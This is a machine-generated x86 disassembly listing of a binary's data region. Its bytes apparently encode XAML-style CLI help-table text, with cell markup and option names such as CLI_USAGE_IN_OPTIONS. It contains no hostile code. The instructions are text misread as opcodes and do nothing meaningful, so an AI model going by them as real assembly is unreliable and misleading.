11009e3d:	and    BYTE PTR [eax],ah
11009e3f:	and    BYTE PTR [esp+edx*2],bh
11009e42:	popa   
11009e43:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009e47:	gs ins BYTE PTR es:[edi],dx
11009e49:	ins    BYTE PTR es:[edi],dx
11009e4a:	ds or  eax,0x2020200a
11009e50:	and    BYTE PTR [eax],ah
11009e52:	and    BYTE PTR [eax],ah
11009e54:	and    BYTE PTR [eax],ah
11009e56:	and    BYTE PTR [eax+edx*2],bh
11009e59:	popa   
11009e5a:	jb     0x11009ebd
11009e5c:	addr16 jb 0x11009ec0
11009e5f:	jo     0x11009ec9
11009e61:	ds inc esp
11009e63:	pop    ecx
11009e64:	dec    esi
11009e65:	inc    ecx
11009e66:	dec    ebp
11009e67:	dec    ecx
11009e68:	inc    ebx
11009e69:	pop    edi
11009e6a:	push   eax
11009e6b:	inc    ecx
11009e6c:	inc    ebx
11009e6d:	dec    ebx
11009e6e:	inc    ecx
11009e6f:	inc    edi
11009e70:	inc    ebp
11009e71:	dec    esp
11009e72:	dec    ecx
11009e73:	push   ebx
11009e74:	push   esp
11009e75:	cmp    al,0x2f
11009e77:	push   eax
11009e78:	popa   
11009e79:	jb     0x11009edc
11009e7b:	addr16 jb 0x11009edf
11009e7e:	jo     0x11009ee8
11009e80:	ds or  eax,0x2020200a
11009e86:	and    BYTE PTR [eax],ah
11009e88:	and    BYTE PTR [eax],ah
11009e8a:	and    BYTE PTR [edi+ebp*1],bh
11009e8d:	push   esp
11009e8e:	popa   
11009e8f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009e93:	gs ins BYTE PTR es:[edi],dx
11009e95:	ins    BYTE PTR es:[edi],dx
11009e96:	ds or  eax,0x2020200a
11009e9c:	and    BYTE PTR [eax],ah
11009e9e:	and    BYTE PTR [edi+ebp*1],bh
11009ea1:	push   esp
11009ea2:	popa   
11009ea3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009ea7:	outs   dx,DWORD PTR ds:[esi]
11009ea8:	ja     0x11009ee8
11009eaa:	or     eax,0x2020200a
11009eaf:	and    BYTE PTR [eax],ah
11009eb1:	and    BYTE PTR [esp+edx*2],bh
11009eb4:	popa   
11009eb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009eb9:	outs   dx,DWORD PTR ds:[esi]
11009eba:	ja     0x11009efa
11009ebc:	or     eax,0x2020200a
11009ec1:	and    BYTE PTR [eax],ah
11009ec3:	and    BYTE PTR [eax],ah
11009ec5:	and    BYTE PTR [esp+edx*2],bh
11009ec8:	popa   
11009ec9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009ecd:	gs ins BYTE PTR es:[edi],dx
11009ecf:	ins    BYTE PTR es:[edi],dx
11009ed0:	and    BYTE PTR [ebx+0x6f],al
11009ed3:	ins    BYTE PTR es:[edi],dx
11009ed4:	jne    0x11009f43
11009ed6:	outs   dx,BYTE PTR ds:[esi]
11009ed7:	push   ebx
11009ed8:	jo     0x11009f3b
11009eda:	outs   dx,BYTE PTR ds:[esi]
11009edb:	cmp    eax,0x3e223222
11009ee0:	or     eax,0x2020200a
11009ee5:	and    BYTE PTR [eax],ah
11009ee7:	and    BYTE PTR [eax],ah
11009ee9:	and    BYTE PTR [edi+ebp*1],bh
11009eec:	push   esp
11009eed:	popa   
11009eee:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009ef2:	gs ins BYTE PTR es:[edi],dx
11009ef4:	ins    BYTE PTR es:[edi],dx
11009ef5:	ds or  eax,0x2020200a
11009efb:	and    BYTE PTR [eax],ah
11009efd:	and    BYTE PTR [edi+ebp*1],bh
11009f00:	push   esp
11009f01:	popa   
11009f02:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009f06:	outs   dx,DWORD PTR ds:[esi]
11009f07:	ja     0x11009f47
11009f09:	or     eax,0x2020200a
11009f0e:	and    BYTE PTR [edi+ebp*1],bh
11009f11:	push   esp
11009f12:	popa   
11009f13:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009f17:	outs   dx,DWORD PTR ds:[esi]
11009f18:	ja     0x11009f61
11009f1a:	jb     0x11009f8b
11009f1c:	jne    0x11009f8e
11009f1e:	ds or  eax,0x2020200a
11009f24:	and    BYTE PTR ds:0x2020200a,cl
11009f2a:	and    BYTE PTR [esp+edx*2],bh
11009f2d:	popa   
11009f2e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009f32:	outs   dx,DWORD PTR ds:[esi]
11009f33:	ja     0x11009f7c
11009f35:	jb     0x11009fa6
11009f37:	jne    0x11009fa9
11009f39:	and    BYTE PTR [ebx+0x74],dl
11009f3c:	jns    0x11009faa
11009f3e:	gs cmp eax,0x74537b22
11009f44:	popa   
11009f45:	je     0x11009fb0
11009f47:	arpl   WORD PTR [edx+0x65],dx
11009f4a:	jae    0x11009fbb
11009f4c:	jne    0x11009fc0
11009f4e:	arpl   WORD PTR [ebp+0x20],sp
11009f51:	push   0x65646165
11009f56:	jb     0x11009f9e
11009f58:	outs   dx,DWORD PTR ds:[esi]
11009f59:	outs   dx,DWORD PTR ds:[esi]
11009f5a:	je     0x11009fc1
11009f5c:	jb     0x11009fb0
11009f5e:	outs   dx,DWORD PTR ds:[esi]
11009f5f:	ja     0x11009fb4
11009f61:	je     0x11009fdc
11009f63:	ins    BYTE PTR es:[edi],dx
11009f64:	gs jge 0x11009f89
11009f67:	ds or  eax,0x200a0d0a
11009f6d:	and    BYTE PTR [eax],ah
11009f6f:	and    BYTE PTR [eax],ah
11009f71:	and    BYTE PTR [esp+edx*2],bh
11009f74:	popa   
11009f75:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009f79:	outs   dx,DWORD PTR ds:[esi]
11009f7a:	ja     0x11009fba
11009f7c:	or     eax,0x2020200a
11009f81:	and    BYTE PTR [eax],ah
11009f83:	and    BYTE PTR [eax],ah
11009f85:	and    BYTE PTR [esp+edx*2],bh
11009f88:	popa   
11009f89:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009f8d:	gs ins BYTE PTR es:[edi],dx
11009f8f:	ins    BYTE PTR es:[edi],dx
11009f90:	and    BYTE PTR [ebx+0x6f],al
11009f93:	ins    BYTE PTR es:[edi],dx
11009f94:	jne    0x1100a003
11009f96:	outs   dx,BYTE PTR ds:[esi]
11009f97:	push   ebx
11009f98:	jo     0x11009ffb
11009f9a:	outs   dx,BYTE PTR ds:[esi]
11009f9b:	cmp    eax,0x3e223222
11009fa0:	or     eax,0x2020200a
11009fa5:	and    BYTE PTR [eax],ah
11009fa7:	and    BYTE PTR [eax],ah
11009fa9:	and    BYTE PTR [eax],ah
11009fab:	and    BYTE PTR [eax+edx*2],bh
11009fae:	popa   
11009faf:	jb     0x1100a012
11009fb1:	addr16 jb 0x1100a015
11009fb4:	jo     0x1100a01e
11009fb6:	ds inc ebx
11009fb8:	dec    esp
11009fb9:	dec    ecx
11009fba:	pop    edi
11009fbb:	push   ebp
11009fbc:	push   ebx
11009fbd:	inc    ecx
11009fbe:	inc    edi
11009fbf:	inc    ebp
11009fc0:	pop    edi
11009fc1:	inc    ebp
11009fc2:	pop    eax
11009fc3:	push   esp
11009fc4:	pop    edi
11009fc5:	dec    edi
11009fc6:	push   eax
11009fc7:	push   esp
11009fc8:	dec    ecx
11009fc9:	dec    edi
11009fca:	dec    esi
11009fcb:	push   ebx
11009fcc:	cmp    al,0x2f
11009fce:	push   eax
11009fcf:	popa   
11009fd0:	jb     0x1100a033
11009fd2:	addr16 jb 0x1100a036
11009fd5:	jo     0x1100a03f
11009fd7:	ds or  eax,0x2020200a
11009fdd:	and    BYTE PTR [eax],ah
11009fdf:	and    BYTE PTR [eax],ah
11009fe1:	and    BYTE PTR [edi+ebp*1],bh
11009fe4:	push   esp
11009fe5:	popa   
11009fe6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009fea:	gs ins BYTE PTR es:[edi],dx
11009fec:	ins    BYTE PTR es:[edi],dx
11009fed:	ds or  eax,0x2020200a
11009ff3:	and    BYTE PTR [eax],ah
11009ff5:	and    BYTE PTR [edi+ebp*1],bh
11009ff8:	push   esp
11009ff9:	popa   
11009ffa:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009ffe:	outs   dx,DWORD PTR ds:[esi]
11009fff:	ja     0x1100a03f
1100a001:	or     eax,0x200a0d0a
1100a006:	and    BYTE PTR [eax],ah
1100a008:	and    BYTE PTR [edi+ebp*1],bh
1100a00b:	push   esp
1100a00c:	popa   
1100a00d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a011:	outs   dx,DWORD PTR ds:[esi]
1100a012:	ja     0x1100a05b
1100a014:	jb     0x1100a085
1100a016:	jne    0x1100a088
1100a018:	ds or  eax,0x2020200a
1100a01e:	and    BYTE PTR [esp+edx*2],bh
1100a021:	popa   
1100a022:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a026:	outs   dx,DWORD PTR ds:[esi]
1100a027:	ja     0x1100a070
1100a029:	jb     0x1100a09a
1100a02b:	jne    0x1100a09d
1100a02d:	and    BYTE PTR [ebx+0x74],dl
1100a030:	jns    0x1100a09e
1100a032:	gs cmp eax,0x74537b22
1100a038:	popa   
1100a039:	je     0x1100a0a4
1100a03b:	arpl   WORD PTR [edx+0x65],dx
1100a03e:	jae    0x1100a0af
1100a040:	jne    0x1100a0b4
1100a042:	arpl   WORD PTR [ebp+0x20],sp
1100a045:	fs popa 
1100a047:	je     0x1100a0aa
1100a049:	push   edx
1100a04a:	outs   dx,DWORD PTR ds:[esi]
1100a04b:	ja     0x1100a0a0
1100a04d:	je     0x1100a0c8
1100a04f:	ins    BYTE PTR es:[edi],dx
1100a050:	gs jge 0x1100a075
1100a053:	ds or  eax,0x200a0d0a
1100a059:	and    BYTE PTR [eax],ah
1100a05b:	and    BYTE PTR [eax],ah
1100a05d:	and    BYTE PTR [esp+edx*2],bh
1100a060:	popa   
1100a061:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a065:	outs   dx,DWORD PTR ds:[esi]
1100a066:	ja     0x1100a0a6
1100a068:	or     eax,0x2020200a
1100a06d:	and    BYTE PTR [eax],ah
1100a06f:	and    BYTE PTR [eax],ah
1100a071:	and    BYTE PTR [esp+edx*2],bh
1100a074:	popa   
1100a075:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a079:	gs ins BYTE PTR es:[edi],dx
1100a07b:	ins    BYTE PTR es:[edi],dx
1100a07c:	ds or  eax,0x2020200a
1100a082:	and    BYTE PTR [eax],ah
1100a084:	and    BYTE PTR [eax],ah
1100a086:	and    BYTE PTR [eax],ah
1100a088:	and    BYTE PTR [eax+edx*2],bh
1100a08b:	popa   
1100a08c:	jb     0x1100a0ef
1100a08e:	addr16 jb 0x1100a0f2
1100a091:	jo     0x1100a0fb
1100a093:	and    BYTE PTR [esi+0x6f],al
1100a096:	jb     0x1100a0fd
1100a098:	addr16 jb 0x1100a10a
1100a09b:	jne    0x1100a10b
1100a09d:	fs cmp eax,0x756c4222
1100a0a3:	and    bh,BYTE PTR gs:[esi]
1100a0a6:	inc    ebx
1100a0a7:	dec    esp
1100a0a8:	dec    ecx
1100a0a9:	pop    edi
1100a0aa:	push   ebp
1100a0ab:	push   ebx
1100a0ac:	inc    ecx
1100a0ad:	inc    edi
1100a0ae:	inc    ebp
1100a0af:	pop    edi
1100a0b0:	dec    ecx
1100a0b1:	dec    esi
1100a0b2:	pop    edi
1100a0b3:	dec    edi
1100a0b4:	push   eax
1100a0b5:	push   esp
1100a0b6:	dec    ecx
1100a0b7:	dec    edi
1100a0b8:	dec    esi
1100a0b9:	cmp    al,0x2f
1100a0bb:	push   eax
1100a0bc:	popa   
1100a0bd:	jb     0x1100a120
1100a0bf:	addr16 jb 0x1100a123
1100a0c2:	jo     0x1100a12c
1100a0c4:	ds or  eax,0x2020200a
1100a0ca:	and    BYTE PTR [eax],ah
1100a0cc:	and    BYTE PTR [eax],ah
1100a0ce:	and    BYTE PTR [edi+ebp*1],bh
1100a0d1:	push   esp
1100a0d2:	popa   
1100a0d3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a0d7:	gs ins BYTE PTR es:[edi],dx
1100a0d9:	ins    BYTE PTR es:[edi],dx
1100a0da:	ds or  eax,0x2020200a
1100a0e0:	and    BYTE PTR [eax],ah
1100a0e2:	and    BYTE PTR [eax],ah
1100a0e4:	and    BYTE PTR [esp+edx*2],bh
1100a0e7:	popa   
1100a0e8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a0ec:	gs ins BYTE PTR es:[edi],dx
1100a0ee:	ins    BYTE PTR es:[edi],dx
1100a0ef:	ds or  eax,0x2020200a
1100a0f5:	and    BYTE PTR [eax],ah
1100a0f7:	and    BYTE PTR [eax],ah
1100a0f9:	and    BYTE PTR [eax],ah
1100a0fb:	and    BYTE PTR [eax+edx*2],bh
1100a0fe:	popa   
1100a0ff:	jb     0x1100a162
1100a101:	addr16 jb 0x1100a165
1100a104:	jo     0x1100a16e
1100a106:	ds inc ebx
1100a108:	dec    esp
1100a109:	dec    ecx
1100a10a:	pop    edi
1100a10b:	push   ebp
1100a10c:	push   ebx
1100a10d:	inc    ecx
1100a10e:	inc    edi
1100a10f:	inc    ebp
1100a110:	pop    edi
1100a111:	dec    ecx
1100a112:	dec    esi
1100a113:	pop    edi
1100a114:	dec    edi
1100a115:	push   eax
1100a116:	push   esp
1100a117:	dec    ecx
1100a118:	dec    edi
1100a119:	dec    esi
1100a11a:	pop    edi
1100a11b:	inc    esp
1100a11c:	inc    ebp
1100a11d:	push   ebx
1100a11e:	inc    ebx
1100a11f:	cmp    al,0x2f
1100a121:	push   eax
1100a122:	popa   
1100a123:	jb     0x1100a186
1100a125:	addr16 jb 0x1100a189
1100a128:	jo     0x1100a192
1100a12a:	ds or  eax,0x2020200a
1100a130:	and    BYTE PTR [eax],ah
1100a132:	and    BYTE PTR [eax],ah
1100a134:	and    BYTE PTR [edi+ebp*1],bh
1100a137:	push   esp
1100a138:	popa   
1100a139:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a13d:	gs ins BYTE PTR es:[edi],dx
1100a13f:	ins    BYTE PTR es:[edi],dx
1100a140:	ds or  eax,0x2020200a
1100a146:	and    BYTE PTR [eax],ah
1100a148:	and    BYTE PTR [edi+ebp*1],bh
1100a14b:	push   esp
1100a14c:	popa   
1100a14d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a151:	outs   dx,DWORD PTR ds:[esi]
1100a152:	ja     0x1100a192
1100a154:	or     eax,0x200a0d0a
1100a159:	and    BYTE PTR [eax],ah
1100a15b:	and    BYTE PTR [eax],ah
1100a15d:	and    BYTE PTR [esp+edx*2],bh
1100a160:	popa   
1100a161:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a165:	outs   dx,DWORD PTR ds:[esi]
1100a166:	ja     0x1100a1a6
1100a168:	or     eax,0x2020200a
1100a16d:	and    BYTE PTR [eax],ah
1100a16f:	and    BYTE PTR [eax],ah
1100a171:	and    BYTE PTR [esp+edx*2],bh
1100a174:	popa   
1100a175:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a179:	gs ins BYTE PTR es:[edi],dx
1100a17b:	ins    BYTE PTR es:[edi],dx
1100a17c:	ds or  eax,0x2020200a
1100a182:	and    BYTE PTR [eax],ah
1100a184:	and    BYTE PTR [eax],ah
1100a186:	and    BYTE PTR [eax],ah
1100a188:	and    BYTE PTR [eax+edx*2],bh
1100a18b:	popa   
1100a18c:	jb     0x1100a1ef
1100a18e:	addr16 jb 0x1100a1f2
1100a191:	jo     0x1100a1fb
1100a193:	and    BYTE PTR [esi+0x6f],al
1100a196:	jb     0x1100a1fd
1100a198:	addr16 jb 0x1100a20a
1100a19b:	jne    0x1100a20b
1100a19d:	fs cmp eax,0x756c4222
1100a1a3:	and    bh,BYTE PTR gs:[esi]
1100a1a6:	inc    ebx
1100a1a7:	dec    esp
1100a1a8:	dec    ecx
1100a1a9:	pop    edi
1100a1aa:	push   ebp
1100a1ab:	push   ebx
1100a1ac:	inc    ecx
1100a1ad:	inc    edi
1100a1ae:	inc    ebp
1100a1af:	pop    edi
1100a1b0:	dec    edi
1100a1b1:	push   ebp
1100a1b2:	push   esp
1100a1b3:	pop    edi
1100a1b4:	dec    edi
1100a1b5:	push   eax
1100a1b6:	push   esp
1100a1b7:	dec    ecx
1100a1b8:	dec    edi
1100a1b9:	dec    esi
1100a1ba:	cmp    al,0x2f
1100a1bc:	push   eax
1100a1bd:	popa   
1100a1be:	jb     0x1100a221
1100a1c0:	addr16 jb 0x1100a224
1100a1c3:	jo     0x1100a22d
1100a1c5:	ds or  eax,0x2020200a
1100a1cb:	and    BYTE PTR [eax],ah
1100a1cd:	and    BYTE PTR [eax],ah
1100a1cf:	and    BYTE PTR [edi+ebp*1],bh
1100a1d2:	push   esp
1100a1d3:	popa   
1100a1d4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a1d8:	gs ins BYTE PTR es:[edi],dx
1100a1da:	ins    BYTE PTR es:[edi],dx
1100a1db:	ds or  eax,0x2020200a
1100a1e1:	and    BYTE PTR [eax],ah
1100a1e3:	and    BYTE PTR [eax],ah
1100a1e5:	and    BYTE PTR [esp+edx*2],bh
1100a1e8:	popa   
1100a1e9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a1ed:	gs ins BYTE PTR es:[edi],dx
1100a1ef:	ins    BYTE PTR es:[edi],dx
1100a1f0:	ds or  eax,0x2020200a
1100a1f6:	and    BYTE PTR [eax],ah
1100a1f8:	and    BYTE PTR [eax],ah
1100a1fa:	and    BYTE PTR [eax],ah
1100a1fc:	and    BYTE PTR [eax+edx*2],bh
1100a1ff:	popa   
1100a200:	jb     0x1100a263
1100a202:	addr16 jb 0x1100a266
1100a205:	jo     0x1100a26f
1100a207:	ds inc ebx
1100a209:	dec    esp
1100a20a:	dec    ecx
1100a20b:	pop    edi
1100a20c:	push   ebp
1100a20d:	push   ebx
1100a20e:	inc    ecx
1100a20f:	inc    edi
1100a210:	inc    ebp
1100a211:	pop    edi
1100a212:	dec    edi
1100a213:	push   ebp
1100a214:	push   esp
1100a215:	pop    edi
1100a216:	dec    edi
1100a217:	push   eax
1100a218:	push   esp
1100a219:	dec    ecx
1100a21a:	dec    edi
1100a21b:	dec    esi
1100a21c:	pop    edi
1100a21d:	inc    esp
1100a21e:	inc    ebp
1100a21f:	push   ebx
1100a220:	inc    ebx
1100a221:	cmp    al,0x2f
1100a223:	push   eax
1100a224:	popa   
1100a225:	jb     0x1100a288
1100a227:	addr16 jb 0x1100a28b
1100a22a:	jo     0x1100a294
1100a22c:	ds or  eax,0x2020200a
1100a232:	and    BYTE PTR [eax],ah
1100a234:	and    BYTE PTR [eax],ah
1100a236:	and    BYTE PTR [edi+ebp*1],bh
1100a239:	push   esp
1100a23a:	popa   
1100a23b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a23f:	gs ins BYTE PTR es:[edi],dx
1100a241:	ins    BYTE PTR es:[edi],dx
1100a242:	ds or  eax,0x2020200a
1100a248:	and    BYTE PTR [eax],ah
1100a24a:	and    BYTE PTR [edi+ebp*1],bh
1100a24d:	push   esp
1100a24e:	popa   
1100a24f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a253:	outs   dx,DWORD PTR ds:[esi]
1100a254:	ja     0x1100a294
1100a256:	or     eax,0x200a0d0a
1100a25b:	and    BYTE PTR [eax],ah
1100a25d:	and    BYTE PTR [eax],ah
1100a25f:	and    BYTE PTR [esp+edx*2],bh
1100a262:	popa   
1100a263:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a267:	outs   dx,DWORD PTR ds:[esi]
1100a268:	ja     0x1100a2a8
1100a26a:	or     eax,0x2020200a
1100a26f:	and    BYTE PTR [eax],ah
1100a271:	and    BYTE PTR [eax],ah
1100a273:	and    BYTE PTR [esp+edx*2],bh
1100a276:	popa   
1100a277:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a27b:	gs ins BYTE PTR es:[edi],dx
1100a27d:	ins    BYTE PTR es:[edi],dx
1100a27e:	ds or  eax,0x2020200a
1100a284:	and    BYTE PTR [eax],ah
1100a286:	and    BYTE PTR [eax],ah
1100a288:	and    BYTE PTR [eax],ah
1100a28a:	and    BYTE PTR [eax+edx*2],bh
1100a28d:	popa   
1100a28e:	jb     0x1100a2f1
1100a290:	addr16 jb 0x1100a2f4
1100a293:	jo     0x1100a2fd
1100a295:	and    BYTE PTR [esi+0x6f],al
1100a298:	jb     0x1100a2ff
1100a29a:	addr16 jb 0x1100a30c
1100a29d:	jne    0x1100a30d
1100a29f:	fs cmp eax,0x756c4222
1100a2a5:	and    bh,BYTE PTR gs:[esi]
1100a2a8:	inc    ebx
1100a2a9:	dec    esp
1100a2aa:	dec    ecx
1100a2ab:	pop    edi
1100a2ac:	push   ebp
1100a2ad:	push   ebx
1100a2ae:	inc    ecx
1100a2af:	inc    edi
1100a2b0:	inc    ebp
1100a2b1:	pop    edi
1100a2b2:	dec    eax
1100a2b3:	dec    edi
1100a2b4:	dec    esi
1100a2b5:	dec    edi
1100a2b6:	push   edx
1100a2b7:	dec    edi
1100a2b8:	inc    ecx
1100a2b9:	pop    edi
1100a2ba:	dec    edi
1100a2bb:	push   eax
1100a2bc:	push   esp
1100a2bd:	dec    ecx
1100a2be:	dec    edi
1100a2bf:	dec    esi
1100a2c0:	cmp    al,0x2f
1100a2c2:	push   eax
1100a2c3:	popa   
1100a2c4:	jb     0x1100a327
1100a2c6:	addr16 jb 0x1100a32a
1100a2c9:	jo     0x1100a333
1100a2cb:	ds or  eax,0x2020200a
1100a2d1:	and    BYTE PTR [eax],ah
1100a2d3:	and    BYTE PTR [eax],ah
1100a2d5:	and    BYTE PTR [edi+ebp*1],bh
1100a2d8:	push   esp
1100a2d9:	popa   
1100a2da:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a2de:	gs ins BYTE PTR es:[edi],dx
1100a2e0:	ins    BYTE PTR es:[edi],dx
1100a2e1:	ds or  eax,0x2020200a
1100a2e7:	and    BYTE PTR [eax],ah
1100a2e9:	and    BYTE PTR [eax],ah
1100a2eb:	and    BYTE PTR [esp+edx*2],bh
1100a2ee:	popa   
1100a2ef:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a2f3:	gs ins BYTE PTR es:[edi],dx
1100a2f5:	ins    BYTE PTR es:[edi],dx
1100a2f6:	ds or  eax,0x2020200a
1100a2fc:	and    BYTE PTR [eax],ah
1100a2fe:	and    BYTE PTR [eax],ah
1100a300:	and    BYTE PTR [eax],ah
1100a302:	and    BYTE PTR [eax+edx*2],bh
1100a305:	popa   
1100a306:	jb     0x1100a369
1100a308:	addr16 jb 0x1100a36c
1100a30b:	jo     0x1100a375
1100a30d:	ds inc ebx
1100a30f:	dec    esp
1100a310:	dec    ecx
1100a311:	pop    edi
1100a312:	push   ebp
1100a313:	push   ebx
1100a314:	inc    ecx
1100a315:	inc    edi
1100a316:	inc    ebp
1100a317:	pop    edi
1100a318:	dec    eax
1100a319:	dec    edi
1100a31a:	dec    esi
1100a31b:	dec    edi
1100a31c:	push   edx
1100a31d:	dec    edi
1100a31e:	inc    ecx
1100a31f:	pop    edi
1100a320:	dec    edi
1100a321:	push   eax
1100a322:	push   esp
1100a323:	dec    ecx
1100a324:	dec    edi
1100a325:	dec    esi
1100a326:	pop    edi
1100a327:	inc    esp
1100a328:	inc    ebp
1100a329:	push   ebx
1100a32a:	inc    ebx
1100a32b:	cmp    al,0x2f
1100a32d:	push   eax
1100a32e:	popa   
1100a32f:	jb     0x1100a392
1100a331:	addr16 jb 0x1100a395
1100a334:	jo     0x1100a39e
1100a336:	ds or  eax,0x2020200a
1100a33c:	and    BYTE PTR [eax],ah
1100a33e:	and    BYTE PTR [eax],ah
1100a340:	and    BYTE PTR [edi+ebp*1],bh
1100a343:	push   esp
1100a344:	popa   
1100a345:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a349:	gs ins BYTE PTR es:[edi],dx
1100a34b:	ins    BYTE PTR es:[edi],dx
1100a34c:	ds or  eax,0x2020200a
1100a352:	and    BYTE PTR [eax],ah
1100a354:	and    BYTE PTR [edi+ebp*1],bh
1100a357:	push   esp
1100a358:	popa   
1100a359:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a35d:	outs   dx,DWORD PTR ds:[esi]
1100a35e:	ja     0x1100a39e
1100a360:	or     eax,0x2020200a
1100a365:	and    BYTE PTR [eax],ah
1100a367:	and    BYTE PTR ds:0x2020200a,cl
1100a36d:	and    BYTE PTR [eax],ah
1100a36f:	and    BYTE PTR [esp+edx*2],bh
1100a372:	popa   
1100a373:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a377:	outs   dx,DWORD PTR ds:[esi]
1100a378:	ja     0x1100a3b8
1100a37a:	or     eax,0x2020200a
1100a37f:	and    BYTE PTR [eax],ah
1100a381:	and    BYTE PTR [eax],ah
1100a383:	and    BYTE PTR [esp+edx*2],bh
1100a386:	popa   
1100a387:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a38b:	gs ins BYTE PTR es:[edi],dx
1100a38d:	ins    BYTE PTR es:[edi],dx
1100a38e:	ds or  eax,0x2020200a
1100a394:	and    BYTE PTR [eax],ah
1100a396:	and    BYTE PTR [eax],ah
1100a398:	and    BYTE PTR [eax],ah
1100a39a:	and    BYTE PTR [eax+edx*2],bh
1100a39d:	popa   
1100a39e:	jb     0x1100a401
1100a3a0:	addr16 jb 0x1100a404
1100a3a3:	jo     0x1100a40d
1100a3a5:	and    BYTE PTR [esi+0x6f],al
1100a3a8:	jb     0x1100a40f
1100a3aa:	addr16 jb 0x1100a41c
1100a3ad:	jne    0x1100a41d
1100a3af:	fs cmp eax,0x756c4222
1100a3b5:	and    bh,BYTE PTR gs:[esi]
1100a3b8:	inc    ebx
1100a3b9:	dec    esp
1100a3ba:	dec    ecx
1100a3bb:	pop    edi
1100a3bc:	push   ebp
1100a3bd:	push   ebx
1100a3be:	inc    ecx
1100a3bf:	inc    edi
1100a3c0:	inc    ebp
1100a3c1:	pop    edi
1100a3c2:	push   ebx
1100a3c3:	push   esp
1100a3c4:	push   edx
1100a3c5:	dec    ecx
1100a3c6:	push   eax
1100a3c7:	dec    edi
1100a3c8:	inc    ecx
1100a3c9:	pop    edi
1100a3ca:	dec    edi
1100a3cb:	push   eax
1100a3cc:	push   esp
1100a3cd:	dec    ecx
1100a3ce:	dec    edi
1100a3cf:	dec    esi
1100a3d0:	and    BYTE PTR [edi+ebp*1],bh
1100a3d3:	push   eax
1100a3d4:	popa   
1100a3d5:	jb     0x1100a438
1100a3d7:	addr16 jb 0x1100a43b
1100a3da:	jo     0x1100a444
1100a3dc:	ds or  eax,0x2020200a
1100a3e2:	and    BYTE PTR [eax],ah
1100a3e4:	and    BYTE PTR [eax],ah
1100a3e6:	and    BYTE PTR [edi+ebp*1],bh
1100a3e9:	push   esp
1100a3ea:	popa   
1100a3eb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a3ef:	gs ins BYTE PTR es:[edi],dx
1100a3f1:	ins    BYTE PTR es:[edi],dx
1100a3f2:	ds or  eax,0x2020200a
1100a3f8:	and    BYTE PTR [eax],ah
1100a3fa:	and    BYTE PTR [eax],ah
1100a3fc:	and    BYTE PTR [esp+edx*2],bh
1100a3ff:	popa   
1100a400:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a404:	gs ins BYTE PTR es:[edi],dx
1100a406:	ins    BYTE PTR es:[edi],dx
1100a407:	ds or  eax,0x2020200a
1100a40d:	and    BYTE PTR [eax],ah
1100a40f:	and    BYTE PTR [eax],ah
1100a411:	and    BYTE PTR [eax],ah
1100a413:	and    BYTE PTR [eax+edx*2],bh
1100a416:	popa   
1100a417:	jb     0x1100a47a
1100a419:	addr16 jb 0x1100a47d
1100a41c:	jo     0x1100a486
1100a41e:	ds inc ebx
1100a420:	dec    esp
1100a421:	dec    ecx
1100a422:	pop    edi
1100a423:	push   ebp
1100a424:	push   ebx
1100a425:	inc    ecx
1100a426:	inc    edi
1100a427:	inc    ebp
1100a428:	pop    edi
1100a429:	push   ebx
1100a42a:	push   esp
1100a42b:	push   edx
1100a42c:	dec    ecx
1100a42d:	push   eax
1100a42e:	dec    edi
1100a42f:	inc    ecx
1100a430:	pop    edi
1100a431:	dec    edi
1100a432:	push   eax
1100a433:	push   esp
1100a434:	dec    ecx
1100a435:	dec    edi
1100a436:	dec    esi
1100a437:	pop    edi
1100a438:	inc    esp
1100a439:	inc    ebp
1100a43a:	push   ebx
1100a43b:	inc    ebx
1100a43c:	cmp    al,0x2f
1100a43e:	push   eax
1100a43f:	popa   
1100a440:	jb     0x1100a4a3
1100a442:	addr16 jb 0x1100a4a6
1100a445:	jo     0x1100a4af
1100a447:	ds or  eax,0x2020200a
1100a44d:	and    BYTE PTR [eax],ah
1100a44f:	and    BYTE PTR [eax],ah
1100a451:	and    BYTE PTR [edi+ebp*1],bh
1100a454:	push   esp
1100a455:	popa   
1100a456:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a45a:	gs ins BYTE PTR es:[edi],dx
1100a45c:	ins    BYTE PTR es:[edi],dx
1100a45d:	ds or  eax,0x2020200a
1100a463:	and    BYTE PTR [eax],ah
1100a465:	and    BYTE PTR [edi+ebp*1],bh
1100a468:	push   esp
1100a469:	popa   
1100a46a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
